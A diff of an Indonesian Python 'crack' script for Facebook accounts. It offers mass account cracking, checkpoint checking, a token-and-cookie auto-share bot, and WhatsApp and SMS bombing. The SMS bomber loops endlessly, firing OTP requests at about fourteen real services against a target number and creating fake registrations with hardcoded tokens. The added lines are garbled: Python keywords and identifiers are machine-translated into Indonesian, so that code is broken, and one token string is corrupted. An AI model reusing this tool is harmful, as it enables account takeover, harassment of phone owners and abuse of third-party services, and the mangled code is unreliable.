-	cetak(panel(f'[bold white][[bold green]01[/][bold white]][/] [bold white]Crack Publick OR Friends [[bold green] ON [bold white]][/]\n[bold white][[bold green]02[/][bold white]][/] [bold white]Crack Massal [[bold green] ON [bold white]][/]\n[bold white][[bold green]03[/][bold white]][/] [bold white]Crack Username [[bold green] ON [bold white]]\n[bold white][[bold green]04[/][bold white]][/] [bold white]Crack File [[bold green] ON [bold white]]\n[bold white][[bold green]05[/][bold white]][/] [bold white]Crack Followers [[bold green] ON [bold white]]\n[bold white][[bold green]06[/][bold white]][/] [bold white]Crack Email [[bold green] ON [bold white]]\n[bold white][[bold green]07[/][bold white]][/] [bold white]Cek Result [[bold green] ON [bold white]][/]\n[bold white][[bold green]08[/][bold white]][/] [bold white]Cek Opsi Chekpoint [[bold green] ON [bold white]]\n[bold white][[bold green]09[/][bold white]][/] [bold white]Spam WhatsApp [[bold green] ON [bold white]]\n[bold white][[bold green]10[/][bold white]][/] [bold white]Spam Sms [[bold green] ON [bold white]]\n[bold white][[bold green]11[/][bold white]][/] [bold white]Report Bug [[bold green] ON [bold white]]\n[bold white][[bold red]00[/][bold white]][/] [bold red]Ganti Cookies [[bold green] ON [bold white]][/]',width=90,title=f"[bold green]List Menu",style=f"bold white"))
-	cetak(panel(f'[bold Red]Warning[bold white] Gunakan Script Ini Dengan Baik Jangan Di Salah Gunakan',width=90,title=f"[bold green]Informasi Crack",style=f"bold white"))
+	dia.append(panel(f'[bold white][+[/][bold white]][/] [bold white]Username : [bold green]{my_name}[/]\n[bold white][+[ /][bold white]][/] [bold white]User Idz : [bold green]{my_id}[/]\n[bold white][+[/][bold white]][/] [bold white] User Ip : [bold green]{ip}[/][/]\n[bold white][+[/][bold white]][/] [bold white]User Sc : [bold green]{pengguna}[ /][/] ',width=45,padding=(0,3),style=f"tebal putih"))
+	dia.append(panel(f'[bold putih][+[/][bold putih]][/] [bold putih]Pengarang : [bold hijau]Alvino[/]\n[bold putih][+[/] [putih tebal]][/] [putih tebal]Kode ulang : [hijau tebal]BrayennnXD[/]\n[putih tebal][+[/][putih tebal]][/] [putih tebal]Versi : [hijau tebal] ]3.0[/][/]\n[putih tebal][+[/][putih tebal]][/] [putih tebal]Status : [hijau tebal]Pribadi[/][/] ',lebar=44, padding=(0,3),style=f"tebal putih"))
+	console.print(Kolom(dia))
+	cetak(panel(f"[bold white]Alvino_Xy , DerrXr , Asepit-Gans , Rozhak XD , Dapunta , Nazri XD Dan Lainnya",width=90,title=f"[bold green]Thanks To",padding=(0, 5),style=f"putih tebal"))
+	cetak(panel(f"[bold white][[bold cyan]01[bold white]] Crack Publick [[bold green] ON [bold white]] [bold white][[bold cyan]05[bold white]] Crack Nama pengguna [[bold green] ON [bold white]]\n[bold white][[bold cyan]02[bold white]] Crack Massal [[bold green] ON [bold white]] [bold white][[bold cyan ]06[putih tebal]] Retak Email [[tebal hijau] AKTIF [putih tebal]] [putih tebal][[bold cyan]03[putih tebal]] Pengikut Retak [[hijau tebal] AKTIF [putih tebal]] [tebal putih][[bold cyan]07[bold white]] Hasil Cek [[bold green] ON [bold white]]\n[bold white][[bold cyan]04[bold white]] Crack File [[bold green] ON [bold white]] [bold white][[bold cyan]00[bold white]] [bold red]Ganti Cookies [bold white][[bold green] ON [bold white]]",width=90,title= F"[hijau tebal]Menu Daftar",padding=(0,8),style=f"bold putih"))
+	cetak(panel(f' [bold white]Ketik [bold green]"Bot"[bold white] Untuk Ke Menu Tambahan Di Dalam Script Ini',width=90,title=f"[bold green]Informasi Crack",style= f"putih tebal"))
 	_____brayennn___xd____ = input(f' [+] Pilih Menu Crack : ')
-	if _____brayennn___xd____ in ['1','01']:
+	jika _____brayennn___xd____ di ['1','01']:
 		brayen_dump()
-	elif _____brayennn___xd____ in ['2','02']:
+	elif _____brayennn___xd____ di ['2','02']:
 		dump_massal()
-	elif _____brayennn___xd____ in ['3','03']:
-		crack_nama()
-	elif _____brayennn___xd____ in('4','04'):
-		crack_file()
-	elif _____brayennn___xd____ in('5','05'):
+	elif _____brayennn___xd____ di ['3','03']:
 		pengikut()
-	elif _____brayennn___xd____ in('6','06'):
+	elif _____brayennn___xd____ di ['4','04']:
+		crack_file()
+	elif _____brayennn___xd____ di ['5','05']:
+		crack_nama()
+	elif _____brayennn___xd____ di ['6','06']:
 		crack_email()
-	elif _____brayennn___xd____ in('7','07'):
-		result()
-	elif _____brayennn___xd____ in('8','08'):
-		file_cp()
-	elif _____brayennn___xd____ in('9','09'):
-		spam_wa()
-	elif _____brayennn___xd____ in('10','10'):
-		spam_sms()
-	elif _____brayennn___xd____ in('11','11'):
-		cetak(panel(f"Apapun Bug Pada Script Tolong Laporkan Kepada Saya Agar Bisa Mengembangkan Sc Ini Semakin Dikit Bugnya Semakin Baik Sc Ini , Anda Akan Di Arahkan Ke WhatsApp",width=90,title=f"[bold green]Report Bug",padding=(0,3),style=f"bold white"))
-		os.system("xdg-open https://wa.me/+6282183929059?text=Asalammualikum+Bang+Saya+Mau+Melaporkan+Bug+Pada+Sc+Mu+Bang")
-		time.sleep(3)
-		exit()
-	elif _____brayennn___xd____ in('0','00'):
+	elif _____brayennn___xd____ di ['7','07']:
+		hasil()
+	elif _____brayennn___xd____ di ['bot','Bot','BOT']:
+		bot()
+	elif _____brayennn___xd____ di ['0','00']:
 		os.system('rm -rf .token.txt')
 		os.system('rm -rf .cookie.txt')
 		print(f' [+] {m}Sukses Logout+Hapus Cookies{x}')
-		time.sleep(5)
-		login()
-	else:
-		print(' [+] Pilih Yang Bener Asu ')
-		back()
+		waktu.tidur(5)
+		Gabung()
+	kalau tidak:
+		print(' [+] Pilih Yang Bener Asu')
+		KELUAR()
 def error():
 	print(f' [+] Maaf Fitur Ini Masih Di Perbaiki')
-	time.sleep(4)
-	back() 
-#-------------------[ DOA HALAL ]-----------------------#
-def doa_halal():
-	cetak(nel(f'''{H2}[{K2}+{H2}] {H2}Versi Arab Stay Halal : {K2}  لَّهُمَّ إِنِّيْ ظَلَمْتُ نَفْسِيْ ظُلْمًا كَثِيْرًا، وَلاَ يَغْفِرُ الذُّنُوْبَ إِلاَّ أَنْتَ، فَاغْفِرْ لِيْ مَغْفِرَةً مِنْ عِنْدِكَ، وَارْحَمْنِيْ، إِنَّكَ أَنْتَ الْغَفُوْرُ الرَّحِيْمُ
-{H2}[{K2}+{H2}] {H2}Versi Latin Stay Halal : {K2}Allaahumma innii zholamtu nafsi zhulman katsiiron, wa laa yaghfirudz-dzunuuba illaa anta, faghfir lii maghfirotan min 'indika, warhamni, innaka antal ghofuurur-rahim''',title=f'{P2} {H2}[ {K2}Doa Sebelum Crack {H2}]',subtitle_align='center',padding=1,style='bold white'))
-#------------------[ DEFF SPAM SMS ]-------------------#
+	waktu.tidur(4)
+	kembali()
+#------------------------[ MENU CRACK ]-------------------------#
+def bot():
+	cetak(panel(f"[bold white][[bold cyan]01[bold white]] Cek Opsi Cp [[bold green] ON [bold white]] [bold white][[bold cyan]04[bold white]] Spam WhatsApp [[bold green] ON [bold white]]\n[bold white][[bold cyan]02[bold white]] Spam Sms [[bold green] ON [bold white]] [bold white][[bold cyan]05[bold white]] Bot Share [[bold green] ON [bold white]] [[bold cyan]03[bold white]] Dapatkan Header [[bold green] ON [bold white]][bold white] [ [bold cyan]06[bold white]] Laporkan Bug [[bold green] ON [bold white]]",width=90,title=f"[bold green]Menu Bot",padding=(0,8),style =f"putih tebal"))
+	bray=input(f' [+] Pilih Menu Crack : ')
+	jika bray di(''):
+		print(' [+] Pilih Yang Bener Asu')
+		waktu.tidur(3)
+		kembali()
+	jika bray di('1','01'):
+		file_cp()
+	elif bray in('2','02'):
+		spam_sms()
+	elif bray in('3','03'):
+		siu()
+	elif bray in('4','04'):
+		spam_wa()
+	elif bray in('5','05'):
+		memek()
+	elif bray in('6','06'):
+		cetak(panel(f"Apapun Bug Pada Script Tolong lapor Kepada Saya Agar Bisa menghasilkan Sc Ini Semakin Dikit Bugnya Semakin Baik Sc Ini , Anda Akan Di Arahkan Ke WhatsApp",width=90,title=f"[bold green]Laporkan Bug" ,padding=(0,3),style=f"tebal putih"))
+		os.system("xdg-open https://wa.me/+6289622155832?text=Selamat+Pagi+Bang+Saya+Mau+Melaporkan+Bug+Pada+Sc+Mu+Bang")
+		waktu.tidur(3)
+		KELUAR()
+		
+def siu():
+	awal()
+	dapatkan_data_web()
+	akhir()
+#-----------------[ DEFF BOT SHARE ]-------------------#
+def memek():
+	mencoba:
+		token = buka('.token.txt','r').baca()
+		cok = buka('.cok.txt','r').baca()
+		kuki = {"kuki":cok}
+	kecuali kesalahan IOE:
+		print(' [+] Cookies Kadaluarsa ')
+		waktu.tidur(5)
+		Gabung()
+	link = input(f" [+] Masukan Link Postingan : ")
+	jumlah = int(input(f" [+] Masukan Share : "))
+	memek = datetime.now()
+	mencoba:
+		n = 0
+		header = {"otoritas":"graph.facebook.com","cache-control":"max-age=0","sec-ch-ua-mobile":"?0","user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 seperti Mac OS X) AppleWebKit/605.1.15 (KHTML, seperti Gecko) Versi/12.1 Seluler/15E148 Safari/604.1"}
+		untuk x dalam range(jumlah):
+			n+=1
+			posting = ses.post(f"https://graph.facebook.com/v13.0/me/feed?link={link}&published=0&access_token={token}",headers=header, cookies=cookie).text
+			data = json.memuat(posting)
+			jika "id" di pos:
+				rianxyz = str(datetime.now()-memek).split('.')[0]
+				print(f'\r [+] Berhasil MengShare {n} produk',end='')
+				sys.stdout.flush()
+			kalau tidak:
+				cetak("\n")
+				cetak(nel(f'Bot Auto Share Sudah Berhenti Mungkin Di Karna Cookie Telah Mokad',width=90,padding=0,style='bold white'));exit()
+	kecuali permintaan.pengecualian.ConnectionError:
+		print(f"\n [+] Anda Tidak Terhubung Ke Internet");exit()    
+#-----------------[SMS SPAM DEFF]-------------------#
 
-agent = random.choice(
+agen = random.pilihan(
 		[
-			"Mozilla/5.0 (Linux; Android 6.0.1; SM-J500M Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36",
-			"Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-G900F Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36",
-			"Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.111 Mobile Safari/537.36",
+			"Mozilla/5.0 (Linux; Android 6.0.1; SM-J500M Build/MMB29M) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36",
+			"Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-G900F Build/LRX21T) AppleWebKit/537.36 (KHTML, seperti Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36",
+			"Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X Build/N2G47H) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/63.0.3239.111 Mobile Safari/537.36",
 			"Dalvik/1.6.0 (Linux; U; Android 4.1.1; BroadSign Xpress 1.0.14 B- (720) Build/JRO03H)",
-			"Mozilla/5.0 (Linux; U; Android 4.1.1; en-us; BroadSign Xpress 1.0.15-6 B- (720) Build/JRO03H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30","Mozilla/5.0 (Linux; Android 5.1.1; A37fw Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36",
-			"Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.111 Mobile Safari/537.36"
-			"Mozilla/5.0 (Linux; Android 10; SM-A305F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Mobile Safari/537.36"
+			"Mozilla/5.0 (Linux; U; Android 4.1.1; en-us; BroadSign Xpress 1.0.15-6 B- (720) Build/JRO03H) AppleWebKit/534.30 (KHTML, seperti Gecko) Versi/4.0 Safari/534.30" ,"Mozilla/5.0 (Linux; Android 5.1.1; A37fw Build/LMY47V) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36",
+			"Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/63.0.3239.111 Mobile Safari/537.36"
+			"Mozilla/5.0 (Linux; Android 10; SM-A305F) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/101.0.4951.41 Mobile Safari/537.36"
 	]
 )
 
 def process_data1():
-	sleep(0.10)
+	tidur(0.10)
 	
 def spam_sms():
-	global nomor 
+	nomor global
 	cetak(panel(f''' Masukan Nomor Target Yang Ingin Di Spam Contoh : +6281234567xxx''',width=90,padding=(0,8),style=f"bold white"))
-	nomor = input(f" [+] Input No Hp : +62").replace("+62","")
-	if nomor == "":
-		pass
-	else:
-		while True:
-			for _ in track(range(100), description=f' [+] Sedang Spam...'):process_data1()
+	nomor = masukan(f" [+] Masukan No Hp : +62").replace("+62","")
+	jika nomor == "":
+		lulus
+	kalau tidak:
+		sementara Benar:
+			untuk _ dalam track(range(100), description=f' [+] Sedang Spam...'):process_data1()
 			sxp_sms()
 
-class sxp_sms:
+kelas sxp_sms:
 
-	def __init__(self):
-		self.req = requests.Session()
-		self.main()
+	def __init__(diri sendiri):
+		self.req = request.Session()
+		diri.main()
 
-	def sms_otp_1(self, no):
+	def sms_otp_1(mandiri, tidak):
 		__req__ = self.req.post("https://service.mokapos.com/account/v1/verification/phone/send",
-			headers = {
-				  "accept": "application/json, text/plain, */*",
-				  "authorization": "undefined",
-				  "save-data": "on",
-				  "user-agent": agent,
-				  "content-type": "application/json;charset=UTF-8"
+			tajuk = {
+				  "terima": "aplikasi/json, teks/polos, */*",
+				  "otorisasi": "tidak ditentukan",
+				  "save-data": "aktif",
+				  "agen-pengguna": agen,
+				  "tipe-konten": "aplikasi/json; charset=UTF-8"
 				},
 			json = {
-				 "phone_number": f"+62{no}"
+				 "nomor_telepon": f"+62{no}"
 			  }
-		).text
+		).teks
 
-	def sms_otp_2(self, no):
+	def sms_otp_2(mandiri, tidak):
 		data = json.dumps({
-					"mobile": f"0{no}",
-					"noise": "1583590641573155574",
+					"seluler": f"0{tidak}",
+					"kebisingan": "1583590641573155574",
 					"request_time": "158359064157312",
 					"access_token": "11111"
 				   })
 		__req__ = self.req.post("https://apiservice.rupiahcepatweb.com/webapi/v1/request_login_register_auth_code",
-			headers = {
-				    "accept": "text/html, application/xhtml+xml, application/json, */*",
+			tajuk = {
+				    "terima": "teks/html, aplikasi/xhtml+xml, aplikasi/json, */*",
 				    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
-				    "content-length": "166",
-				    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
-				    "origin": "https://h5.rupiahcepatweb.com",
+				    "panjang konten": "166",
+				    "tipe-konten": "aplikasi/x-www-form-urlencoded; charset=UTF-8",
+				    "asal": "https://h5.rupiahcepatweb.com",
 				    "referer": "https://h5.rupiahcepatweb.com/dua2/pages/openPacket/openPacket.html?activityId=11&invite=200219190100215723",
-				    "sec-fetch-dest": "empty",
+				    "sec-fetch-dest": "kosong",
 				    "sec-fetch-mode": "cors",
-				    "sec-fetch-site": "same-site",
-				    "user-agent": agent
+				    "sec-fetch-site": "situs yang sama",
+				    "agen-pengguna": agen
 				  },
 			data = {
 				 "data": data
 			   }
-		).text
+		).teks
 
-	def sms_otp_3(self, no):
+	def sms_otp_3(mandiri, tidak):
 		__req__ = self.req.post("https://www.olx.co.id/api/auth/authenticate",
-			headers = {
-				    "accept": "*/*",
+			tajuk = {
+				    "menerima": "*/*",
 				    "x-newrelic-id": "VQMGU1ZVDxABU1lbBgMDUlI=",
 				    "x-panamera-fingerprint": "83b09e49653c37fb4dc38423d82d74d7#1597271158063",
-				    "user-agent": agent,
-				    "content-type": "application/json"
+				    "agen-pengguna": agen,
+				    "jenis konten": "aplikasi/json"
 				  },
 			json = {
-				 "grantType": "retry",
-				 "method": "sms",
-				 "phone": no,
-				 "language": "id"
+				 "grantType": "coba lagi",
+				 "metode": "sms",
+				 "No Telepon,
+				 "bahasa": "id"
 				}
-		).text
+		).teks
 
 	def sms_otp_4(self, no):
-		__req__ = self.req.post("https://www.alodokter.com/login-with-phone-number",
-			headers = {
-				    "user-agent": agent,
-				    "content-type": "application/json",
-				    "referer": "https://www.alodokter.com/login-alodokter",
-				    "accept": "application/json",
-				    "origin": "https://www.alodokter.com"
+		__req__ = self.req.post("https://www.alodokter.com/login-dengan-nomor telepon",
+			tajuk = {
+				    "agen-pengguna": agen,
+				    "tipe-konten": "aplikasi/json",
+				    "perujuk": "https://www.alodokter.com/login-alodokter",
+				    "terima": "aplikasi/json",
+				    "asal": "https://www.alodokter.com"
 				  },
 			json = {
-				 "user":{
-					  "phone": f"0{no}"
+				 "pengguna":{
+					  "telepon": f"0{tidak}"
 					}
 				}
-		).text
+		).teks
 
-	def sms_otp_5(self, no):
+	def sms_otp_5(mandiri, tidak):
 		__req__ = self.req.post("https://www.kelaspintar.id/user/otpverification",
-			headers = {
+			tajuk = {
 				    "x-requested-with": "XMLHttpRequest",
-				    "user-agent": agent,
-				    "Referer": "https://www.kelaspintar.id/"
+				    "agen-pengguna": agen,
+				    "Perujuk": "https://www.kelaspintar.id/"
 				  },
 			data = {
-				 "user_mobile": no,
+				 "user_mobile": tidak,
 				 "otp_type": "send_otp_reg",
 				 "mobile_code": "%2B62"
 				}
-		).text
+		).teks
 
-	def sms_otp_6(self, no):
-		aink_sanz = random.choice(
+	def sms_otp_6(mandiri, tidak):
+		aink_sanz = pilihan acak(
 						[
-							"Hallo Mantan",
-							"Hallo Bangsad",
-							"Hallo Sayang",
-							"Hallo Ripper",
-							"Hallo Ngab"
+							"Halo Mantan",
+							"Halo Bangsad",
+							"Halo Sayang",
+							"Halo Ripper",
+							"Halo Ngab"
 						]
 					)
-		email = random.choice(
+		email = acak.pilihan(
 					[
 						"nsnsmsmksksmsm@gmail.com",
 						"lavon.lockman@gmail.com",
@@ -494,14 +538,14 @@ class sxp_sms:
 						"newell.kuhic@gmail.com"
 					]
 				)
-		pw = random.choice(
+		pw = pilihan acak(
 					[
 						"mamsmms123",
 						"Wadepak1037",
 						"waifugw1011"
 					]
 				)
-		birth_date = random.choice(
+		tanggal_lahir = pilihan acak(
 						[
 							"13/09/1999",
 							"04/02/2022",
@@ -514,205 +558,205 @@ class sxp_sms:
 		__req__ = self.req.post("https://www.matahari.com/rest/V1/thorCustomers",
 			json = {
 				"thor_customer":{
-						"name": aink_sanz,
-						"card_number": None,
-						"email_address": email,
+						"nama": aink_sanz,
+						"card_number": Tidak ada,
+						"alamat_email": surel,
 						"mobile_country_code": "+62",
 						"gender_id": "1",
-						"mobile_number": f"0{no}",
+						"nomor_ponsel": f"0{no}",
 						"mro": "",
-						"password": pw,
-						"birth_date": birth_date
+						"kata sandi": pw,
+						"birth_date": tanggal_lahir
 						}
 				},
-			headers = {
+			tajuk = {
 					"Host": "www.matahari.com",
 					"x-newrelic-id": "Vg4GVFVXDxAGVVlVBgcGVlY=",
-					"origin": "https://www.matahari.com",
-					"user-agent": agent,
-					"content-type": "application/json",
-					"accept": "*/*",
+					"asal": "https://www.matahari.com",
+					"agen-pengguna": agen,
+					"tipe-konten": "aplikasi/json",
+					"menerima": "*/*",
 					"x-requested-with": "XMLHttpRequest",
 					"referer": "https://www.matahari.com/customer/account/create/",
 					"accept-encoding": "gzip, deflate, br",
 					"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
 				}
 
-		).text
+		).teks
 
-	def sms_otp_7(self, no):
+	def sms_otp_7(mandiri, tidak):
 		__req__ = self.req.post("https://api.duniagames.co.id/api/user/api/v2/user/send-otp",
-			headers = {
+			tajuk = {
 				    "Host": "api.duniagames.co.id",
-				    "content-length": "32",
-				    "accept": "application/json, text/plain, */*",
-				    "x-device": "cc45ed83-73bd-4a98-83e3-874e8bc11a7f",
+				    "panjang konten": "32",
+				    "terima": "aplikasi/json, teks/polos, */*",
+				    "perangkat x": "cc45ed83-73bd-4a98-83e3-874e8bc11a7f",
 				    "accept-language": "id",
-				    "user-agent": agent,
+				    "agen-pengguna": agen,
 				    "ciam-type": "FR",
-				    "content-type": "application/json",
-				    "origin": "https://duniagames.co.id",
-				    "sec-fetch-site": "same-site",
+				    "tipe-konten": "aplikasi/json",
+				    "asal": "https://duniagames.co.id",
+				    "sec-fetch-site": "situs yang sama",
 				    "sec-fetch-mode": "cors",
-				    "sec-fetch-dest": "empty",
-				    "referer": "https://duniagames.co.id/",
+				    "sec-fetch-dest": "kosong",
+				    "perujuk": "https://duniagames.co.id/",
 				    "accept-encoding": "gzip, deflate, br"
 				  },
 			json = {
-				 "phoneNumber": f"+62{no}"
+				 "nomortelepon": f"+62{tidak}"
 				}
-		).text
+		).teks
 
-	def sms_otp_8(self, no):
+	def sms_otp_8(mandiri, tidak):
 		__req__ = self.req.post("https://harvestcakes.com/register",
-			headers = {
-				    "user-agent": agent,
-				    "Referer": "https://harvestcakes.com/register"
+			tajuk = {
+				    "agen-pengguna": agen,
+				    "Perujuk": "https://harvestcakes.com/register"
 				  },
 			data = {
-				 "phone": f"0{no}",
+				 "telepon": f"0{tidak}",
 				 "url": ""
 				}
-		).text
+		).teks
 
 	def sms_otp_9(self, no):
 		__req__ = self.req.post("https://identity-gateway.oyorooms.com/identity/api/v1/otp/generate_by_phone?locale=id",
-			headers = {
+			tajuk = {
 				    "Host": "identity-gateway.oyorooms.com",
 				    "consumer_host": "https://www.oyorooms.com",
 				    "accept-language": "id",
 				    "access_token": "SFI4TER1WVRTakRUenYtalpLb0w6VnhrNGVLUVlBTE5TcUFVZFpBSnc=",
-				    "user-agent": agent,
-				    "Content-Type": "application/json",
-				    "accept": "*/*",
-				    "origin": "https://www.oyorooms.com",
-				    "referer": "https://www.oyorooms.com/login",
+				    "agen-pengguna": agen,
+				    "Jenis-Konten": "aplikasi/json",
+				    "menerima": "*/*",
+				    "asal": "https://www.oyorooms.com",
+				    "perujuk": "https://www.oyorooms.com/login",
 				    "Accept-Encoding": "gzip, deflate, br"
 				  },
 			json = {
-				 "phone": f"0{no}",
-				 "country_code": "+62",
+				 "telepon": f"0{tidak}",
+				 "kode_negara": "+62",
 				 "country_iso_code": "ID",
-				 "nod": "4",
-				 "send_otp": "true",
-				 "devise_role": "Consumer_Guest"
+				 "mengangguk": "4",
+				 "send_otp": "benar",
+				 "devise_role": "Pelanggan_Tamu"
 				}
-		).text
+		).teks
 
-	def sms_otp_10(self, no):
+	def sms_otp_10(mandiri, tidak):
 		__req__ = self.req.post("https://crp-app.stamps.co.id/api/auth/validate-mobile-number",
 			json = {
-				"mobile_number": f"0{no}",
+				"nomor_ponsel": f"0{no}",
 				"token": "sI01tF5bOSYHabS7HaXiB1k3j0JxFxbcQ79Rd1HFBjKEKJqYAwSNMScsx9AEZq3O"
 				},
-			headers = {
+			tajuk = {
 					"Host": "crp-app.stamps.co.id",
-					"content-type": "application/json; charset=utf-8",
-					"content-length": "106",
+					"tipe konten": "aplikasi/json; charset=utf-8",
+					"panjang konten": "106",
 					"accept-encoding": "gzip",
-					"User-Agent": agent
+					"Agen-Pengguna": agen
 			}
-		).text
+		).teks
 
-	def sms_otp_11(self, no):
+	def sms_otp_11(mandiri, tidak):
 		__req__ = self.req.post("https://app-api.kredito.id/client/v1/common/verify-code/send",
-			headers = {
+			tajuk = {
 				    "LPR-TIMESTAMP": "1603281035821",
 				    "Accept-Language": "id-ID",
 				    "LPR-BRAND": "Kredito",
 				    "LPR-PLATFORM": "android",
-				    "user-agent": agent,
-				    "Authorization": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1aWQiOi0xNjAzMjgxMDE3MjAzLCJ1dHlwZSI6ImFub24iLCJleHAiOjE2MDMyODQ2MTd9._HUnW7FQmMiDWvSejS0MBqMq95l2rk_6PuxDeXY5Oks",
+				    "agen-pengguna": agen,
+				    "Otorisasi": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1aWQiOi0xNjAzMjgxMDE3MjAzLCJ1dHlwZSI6ImFub24iLCJleHAiOjE2MDMyODQ2MTd9._HunW7FQmMiDWvSejS0MBq_Mq95Xl2rkY5",PuksOxl2rkY5
 				    "LPR-SIGNATURE": "e15dbea8602409df32a2ed5a123dc244",
-				    "Content-Type": "application/json; charset=UTF-8",
-				    "Content-Length": "79"
+				    "Jenis Konten": "aplikasi/json; charset=UTF-8",
+				    "Panjang Konten": "79"
 				   },
-			data = '{"event":"default_verification","mobilePhone":"%s","sender":"jatissms"}' % no
-		).text
+			data = '{"event":"default_verification","mobilePhone":"%s","sender":"jatissms"}' % tidak
+		).teks
 
-	def sms_otp_12(self, no):
+	def sms_otp_12(mandiri, tidak):
 		__req__ = self.req.post("https://www.autofun.co.id:443/v2/captcha/sms",
-			headers = {
+			tajuk = {
 					"Host": "www.autofun.co.id",
-					"Connection": "keep-alive",
-					"Content-length": "84",
-					"accept": "*/*",
-					"user-agent": agent,
+					"Koneksi": "tetap hidup",
+					"Panjang konten": "84",
+					"menerima": "*/*",
+					"agen-pengguna": agen,
 					"Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
-					"content-type": "application/json;charset=UTF-8",
-					"Origin": "https://www.autofun.co.id",
+					"tipe-konten": "aplikasi/json; charset=UTF-8",
+					"Asal": "https://www.autofun.co.id",
 					"X-Requested-With": "acr.browser.barebones",
-					"Sec-Fetch-Site": "same-origin",
+					"Sec-Fetch-Site": "asal-sama",
 					"Sec-Fetch-Mode": "cors",
-					"Sec-Fetch-Dest": "empty",
-					"Referer": "https://www.autofun.co.id/mobil/datsun",
+					"Sec-Fetch-Dest": "kosong",
+					"Perujuk": "https://www.autofun.co.id/mobil/datsun",
 					"Accept-Encoding": "gzip, deflate"
 				},
 			json = {
 					"phoneNum": f"62{no}",
-					"languageCode": "id-id",
-					"countryCode": "id",
+					"kode bahasa": "id-id",
+					"kode negara": "id",
 					"platform": 2
 			}
-		).text
+		).teks
 
-	def sms_otp_13(self, no):
+	def sms_otp_13(mandiri, tidak):
 		__req__ = self.req.post("https://api.myfave.com/api/fave/v3/auth",
 			json = {
-					"phone":"+62"+no
+					"telepon":"+62"+tidak
 				},
-			headers = {
+			tajuk = {
 					"Host": "api.myfave.com",
-					"Connection": "keep-alive",
+					"Koneksi": "tetap hidup",
 					"x-user-agent": "Fave-PWA/v1.0.0",
-					"Origin": "https://m.myfave.com",
-					"user-agent": agent,
-					"content-type": "application/json",
-					"Accept": "*/*",
-					"Referer": "https://m.myfave.com/jakarta/auth",
+					"Asal": "https://m.myfave.com",
+					"agen-pengguna": agen,
+					"tipe-konten": "aplikasi/json",
+					"Menerima": "*/*",
+					"Perujuk": "https://m.myfave.com/jakarta/auth",
 					"Accept-Encoding": "gzip, deflate, br",
 					"Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
 			}
-		).text
+		).teks
 
 	def sms_otp_14(self, no):
-		nickname = random.choice(
+		nama panggilan = acak.pilihan(
 					  [
 					    "fahmi",
 					    "xzc0der",
-					    "bed3bah",
+					    "tempat tidur3bah",
 					    "xmanz"
 					  ]
 					)
-		angka = random.randint(
+		angka = acak.randint(
 					111,
 					999
 				      )
 		__req__ = self.req.post("https://wong.kitabisa.com/register/draft",
-			headers = {
+			tajuk = {
 				    "Host": "wong.kitabisa.com",
 				    "x-ktbs-platform-name": "pwa",
-				    "origin": "https://account.kitabisa.com",
+				    "asal": "https://account.kitabisa.com",
 				    "x-ktbs-time": "1611020248",
-				    "user-agent": agent,
+				    "agen-pengguna": agen,
 				    "x-ktbs-api-version": "1.0.0",
-				    "accept": "application/json",
+				    "terima": "aplikasi/json",
 				    "x-ktbs-client-name": "kanvas",
 				    "x-ktbs-request-id": "107790c3-86e0-4872-9dfb-b9c5da9bfa13",
 				    "x-ktbs-client-version": "1.0.0",
 				    "x-ktbs-signature": "e6b4dd627125b3ccd53de193d165c481cc7fdfef0b1dcd7a587636a008fdc89e",
-				    "version": "3.4.0",
+				    "versi": "3.4.0",
 				    "referer": "https://account.kitabisa.com/register/otp?type=sms",
 				    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
 				  },
 			json = {
-				 "full_name": nickname+str(angka),
-				 "username": f"62{no}",
+				 "nama_lengkap": nama panggilan+str(angka),
+				 "nama pengguna": f"62{no}",
 				 "otp_type": "sms"
 				}
-		).text
+		).teks
 
-	def main(self):
+	def utama(diri sendiri):
 		self.sms_otp_1(nomor)
 		self.sms_otp_2(nomor)
 		self.sms_otp_3(nomor)
@@ -729,134 +773,134 @@ class sxp_sms:
 		self.sms_otp_14(nomor)
 		cetak(panel(f"Sukses Spam SMS Ke No : +62{nomor}",width=90,padding=(0,2),style=f"bold white"))
 
-#------------------[ DEFF SPAM WA ]-------------------# 
+#-----------------[ DEFF SPAM WA ]-------------------#
     
-def spam_wa():
-	global nomor
-	cetak(panel(f'''   Masukan Nomor Target Yang Ingin Di Spam Contoh : +6281234567xxx''',width=90,padding=(0,8),style=f"bold white"))
-	nomor = input(f" [+] Input No Hp : +62").replace("+62","")
-	if nomor == "":
-		pass
-	else:
-		while True:
-			for _ in track(range(100), description=f' [+] Sedang Spam...'):process_data1()
+pasti spam_wa():
+	nomor global
